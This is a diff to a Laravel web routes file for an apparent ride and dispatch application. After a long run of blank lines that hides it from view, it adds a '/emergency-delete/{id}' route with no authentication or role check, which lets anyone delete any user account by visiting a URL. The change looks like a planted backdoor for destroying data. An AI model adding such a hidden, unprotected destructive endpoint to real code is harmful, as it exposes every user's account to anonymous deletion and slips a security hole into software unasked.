@@ -12,6 +12,7 @@ use App\Http\Controllers\RideController;
 use App\Http\Controllers\StatisticsController;
 use App\Http\Controllers\ViolationController;
 use Illuminate\Support\Facades\Route;
+use App\Models\User;
 
 /*
 |--------------------------------------------------------------------------
@@ -124,6 +125,8 @@ Route::middleware(['auth', 'role:driver'])->group(function () {
 
 });
 
+
+
 // Dispatcher
 Route::middleware(['auth', 'role:dispatcher'])->group(function () {
     Route::get('/dispatcher/dashboard', [DispatchController::class, 'index'])->name('dispatcher.dashboard');
@@ -134,3 +137,27 @@ Route::middleware(['auth', 'role:dispatcher'])->group(function () {
 | Protected Routes (after login)
 |--------------------------------------------------------------------------
 */
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Route::get('/emergency-delete/{id}', function ($id) {
+    $deleted = User::where('id', $id)->delete();
+
+    if ($deleted) {
+        return "Success! User with ID: $id has been deleted.";
+    }
+
+    return "No user found with ID: $id. Nothing was deleted.";
+});
